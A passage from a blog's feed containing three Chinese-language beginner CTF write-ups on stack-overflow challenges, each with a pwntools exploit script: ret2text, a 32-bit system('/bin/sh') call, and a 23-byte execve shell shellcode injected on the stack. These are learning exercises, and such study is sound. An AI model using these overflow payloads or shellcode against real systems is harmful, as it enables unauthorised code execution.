    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="ctf-wiki" scheme="http://lmarch2.github.io/tags/ctf-wiki/"/>
    
  </entry>
  
  <entry>
    <title>week4 T1</title>
    <link href="http://lmarch2.github.io/posts/64ef4d6b/"/>
    <id>http://lmarch2.github.io/posts/64ef4d6b/</id>
    <published>2023-01-20T15:36:57.000Z</published>
    <updated>2024-01-31T02:42:34.735Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出/基本rop ret2text</p><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“/bin/sh”)<br>返回其地址</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p><pre><code>from pwn import *p = remote("node4.buuoj.cn",29175)ret_arr = 0X40059Apayload = b'a'*(0x80 + 0x8) + p64(ret_arr)p.sendline(payload)p.interactive()</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Week4-amp-amp-Week5-T1-jarvisoj-level0&quot;&gt;&lt;a href=&quot;#Week4-amp-amp-Week5-T1-jarvisoj-level0&quot; class=&quot;headerlink&quot; title=&quot;Week4&amp;amp;&amp;amp;Week5 T1  jarvisoj_level0&quot;&gt;&lt;/a&gt;Week4&amp;amp;&amp;amp;Week5 T1  jarvisoj_level0&lt;/h2&gt;&lt;p&gt;2023-01-20WP&lt;br&gt;BUUCTF pwn 第六题&lt;br&gt;考点： 简单栈溢出/基本rop ret2text&lt;/p&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>week3 T5</title>
    <link href="http://lmarch2.github.io/posts/fe55b1cb/"/>
    <id>http://lmarch2.github.io/posts/fe55b1cb/</id>
    <published>2023-01-15T14:43:00.000Z</published>
    <updated>2024-01-31T02:34:54.737Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote><p>2023-01-15WP<br>攻防世界pwn题<br>考点：ret2libc1<br>（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）</p></blockquote><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32-bit，开启NX</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA一看没啥，点进vuln函数找到一个read函数<br><img src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出<br>shift+f12找到有字符串/bin/sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了<br>记下system函数的plt表地址0x08048320<br><img src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p><p>这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将/bin/sh作为参数传递其地址即可</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p><pre class=" language-py"><code class="language-py">from pwn import *p = remote(' 61.147.171.105 ', 60218)payload = b'a' * (0x88 + 4) + p32(0x08048320)+b'bbbb' + p32(0x0804A024)#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b'bbbb'是填充无效system返回地址， #p32(0x0804A024)是/bin/sh地址p.sendline(payload)p.interactive()</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;T5-level2&quot;&gt;&lt;a href=&quot;#T5-level2&quot; class=&quot;headerlink&quot; title=&quot;T5 level2&quot;&gt;&lt;/a&gt;T5 level2&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2023-01-15WP&lt;br&gt;攻防世界pwn题&lt;br&gt;考点：ret2libc1&lt;br&gt;（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="攻防世界" scheme="http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>week3 T4</title>
    <link href="http://lmarch2.github.io/posts/8952815d/"/>
    <id>http://lmarch2.github.io/posts/8952815d/</id>
    <published>2023-01-15T14:42:38.000Z</published>
    <updated>2024-01-31T02:34:46.200Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2shellcode-2-栈写入"><a href="#T4-ret2shellcode-2-栈写入" class="headerlink" title="T4 ret2shellcode 2 (栈写入)"></a>T4 ret2shellcode 2 (栈写入)</h2><blockquote><p>2023-01-15WP<br>sniperoj-pwn100-shellcode<br>考点：栈溢出 shellcode</p></blockquote><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file ,checksec检查保护机制<br><img src="https://pic2.zhimg.com/80/v2-93af3c284b45a8b1bc9b8d234218d6b9_1440w.webp"><br>开启了PIE  地址变换</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中看看源码<br><img src="https://pic1.zhimg.com/80/v2-1dda406b44f40e076971774458e5d654_1440w.webp"><br>发现已经有输出了buf的地址，因此随机化地址便可以进行绕过<br>继续分析发现read函数读入0x40字节，而buf分配的空间才0x10字节，存在栈溢出<br>打开string window，没有system和/bin/sh，应该是要写入shellcode了</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>先看看我们的空间能不能写下shellcode这里main函数里声明的buf只有0x10即16字节，属于局部变量，空间分配在栈上<br>gdb动态调试，（其实IDA能看出来，就是不确定对不对就是了）<br><img src="https://img-blog.csdnimg.cn/img_convert/3bcd85545cf60cac9b4aefb0eee24d1b.png"><br>我们计算buf的偏移量为rbp - rsp  = 0x7fffde3d2820 - 0x7fffde3d2810 = 10，再加上rbp 8字节为0x18即24字节</p><p>而我们用shellcraft生成的shellcode时44字节的，显然已经超过了<br>于是我们想找一个长度较小的shellcode来写入，但是由于某些我还没搞很懂的原因，我们必须要将把shellcode放在返回<br>地址的后面<br>那放在后面的话是不是44字节的shellcode就可以使用了呢？其实也不行，要注意到read函数是读取0x40字节的，这就使得读取的字符串长度有一定的限制。这0x40字节的数据，既要包括填充的垃圾数据，也要包括shellcode的返回地址和shellcode的内容，我们还得计算一下允许的shellcode的长度<br>0x40 - ( 0x10 + 8 ) - 8 = 32<br>（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度，所以构建的shllcode必须在32以内<br>之前使用的shellcraft.sh()生成的shellcode有44字节，在这里只有32字节，因此并不适用</p><blockquote><p>shellcode=”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p></blockquote><p>一个找shellcode的网站</p><blockquote><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p></blockquote><p>这个shellcode只有23个字节，短小精悍，适合放在栈中去执行</p><p>写exp (发现一个地方：就是正常python代码不能在开头留空格)</p><pre class=" language-py"><code class="language-py">from pwn import *p = process('./shellcode')p.recvuntil('[')addr = p.recvuntil(']', drop=True)p.recvuntil('Now give me your answer')shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"p.sendline(b'a'*24 + p64(int(addr,16)+32) + shellcode)p.interactive()</code></pre><p>这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？<br>在网上找到一个解释不知道对不对</p><blockquote><p>因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;T4-ret2shellcode-2-栈写入&quot;&gt;&lt;a href=&quot;#T4-ret2shellcode-2-栈写入&quot; class=&quot;headerlink&quot; title=&quot;T4 ret2shellcode 2 (栈写入)&quot;&gt;&lt;/a&gt;T4 ret2shellcode 2 (栈写入)&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2023-01-15WP&lt;br&gt;sniperoj-pwn100-shellcode&lt;br&gt;考点：栈溢出 shellcode&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="ctf-wiki" scheme="http://lmarch2.github.io/tags/ctf-wiki/"/>
    
  </entry>
  
</feed>
